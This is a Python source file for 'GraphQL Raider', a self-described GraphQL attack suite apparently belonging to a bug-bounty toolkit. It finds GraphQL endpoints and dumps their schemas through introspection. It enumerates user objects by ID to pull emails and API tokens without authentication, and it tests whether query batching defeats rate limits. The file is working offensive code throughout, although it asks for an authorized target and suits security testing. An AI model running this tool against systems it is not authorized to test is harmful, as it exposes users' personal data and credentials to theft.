#!/usr/bin/env python3
"""
graphql_raider.py — GraphQL attack suite (INTERNAL edition).

GraphQL is a huge modern bounty surface the rest of the kit ignores. This finds
the endpoint, dumps the schema via introspection, hunts IDOR through object
queries, and checks for query batching (which silently defeats rate limits and
amplifies brute-force / IDOR).

    python TOOLS/graphql_raider.py --url http://127.0.0.1:9200/
    python TOOLS/graphql_raider.py --url http://host --endpoint /api/graphql
"""
import argparse
import json
import os
import re
import sys
import urllib.error
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool, FRAMEWORK_VERSION
from privacy_guard import privacy_user_agent

CANDIDATE_PATHS = ["/graphql", "/api/graphql", "/graphql/v1", "/v1/graphql",
                   "/query", "/api/query", "/gql", "/api/gql"]
SENSITIVE_FIELDS = ("token", "apitoken", "secret", "password", "passwd", "ssn",
                    "creditcard", "email", "phone", "privatekey", "session")
INTROSPECTION = '{"query":"{__schema{types{name fields{name}}}}"}'


class GraphQLRaider(VibeTool):
    def __init__(self, base):
        super().__init__("GraphQL Raider", "GraphQL Attack Suite")
        self.base = base.rstrip("/")
        self.findings = 0

    def _post(self, path, raw_json):
        try:
            req = urllib.request.Request(
                self.base + path, data=raw_json.encode(), method="POST",
                headers={"User-Agent": privacy_user_agent("GraphQL Raider"),
                         "Content-Type": "application/json", "Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=8) as r:
                return r.getcode(), r.read(60000).decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            return e.code, e.read(60000).decode("utf-8", "replace")
        except Exception as e:
            return 0, str(e)

    def _find_endpoint(self, override):
        for path in ([override] if override else CANDIDATE_PATHS):
            st, body = self._post(path, INTROSPECTION)
            # `errors` alone is not proof: any JSON API error response contains it.
            # Require introspection data or a real GraphQL response envelope.
            if st and ("__schema" in body
                       or ("\"data\"" in body and "extensions" in body)
                       or "GraphQL" in body):
                return path, body
        return "", ""

    def run(self, endpoint):
        self.banner()
        self.log(f"Locating GraphQL endpoint on {self.base} ...")
        path, intro = self._find_endpoint(endpoint)
        if not path:
            self.log("No GraphQL endpoint responded. Pass --endpoint if it's non-standard.", "warn")
            return 0
        self.log(f"GraphQL endpoint: {path}")

        # 1) Introspection
        if "__schema" in intro:
            fields = re.findall(r'"name"\s*:\s*"([^"]+)"', intro)
            sensitive = sorted({f for f in fields if f.lower() in SENSITIVE_FIELDS})
            self.log("INTROSPECTION ENABLED — full schema is readable by anyone", "hack")
            self.findings += 1
            if sensitive:
                self.log(f"  sensitive fields exposed in schema: {', '.join(sensitive)}", "crit")
        else:
            self.log("Introspection appears disabled (good).", "pass")

        # 2) IDOR via object queries
        leaked = []
        for oid in range(1, 6):
            st, body = self._post(path, json.dumps({"query": f"{{ user(id:{oid}) {{ id name email apiToken }} }}"}))
            if st == 200 and '"apiToken"' in body and "null" not in body.split('"user"')[-1][:20]:
                leaked.append((oid, body))
        if len(leaked) >= 2:
            self.log(f"BROKEN OBJECT-LEVEL AUTH (IDOR) — enumerated {len(leaked)} users' objects "
                     f"incl. apiToken with no auth", "hack")
            self.findings += 1
            self.log(f"  sample: {leaked[-1][1][:160]}", "crit")

        # 3) Query batching (rate-limit bypass / amplification)
        batch = "[" + ",".join(['{"query":"{ user(id:%d){id} }"}' % i for i in range(1, 6)]) + "]"
        st, body = self._post(path, batch)
        if st == 200 and body.strip().startswith("[") and body.count('"data"') >= 3:
            self.log("QUERY BATCHING ENABLED — array of queries runs in one request "
                     "(defeats rate limits, amplifies IDOR/brute-force)", "hack")
            self.findings += 1

        self.log("=" * 40)
        if self.findings:
            self.log(f"GRAPHQL RAID COMPLETE — {self.findings} finding(s)", "hack")
        else:
            self.log("GraphQL surface looks locked down.", "pass")
        return 0


def main(argv=None):
    p = argparse.ArgumentParser(description="GraphQL Raider - GraphQL attack suite")
    p.add_argument("--url", required=True, help="Target base URL you own/are authorized to test")
    p.add_argument("--endpoint", default="", help="GraphQL path (default: autodetect)")
    p.add_argument("-v", "--version", action="version", version=f"GraphQL Raider {FRAMEWORK_VERSION}")
    args = p.parse_args(argv)
    return GraphQLRaider(args.url).run(args.endpoint)


if __name__ == "__main__":
    sys.exit(main())
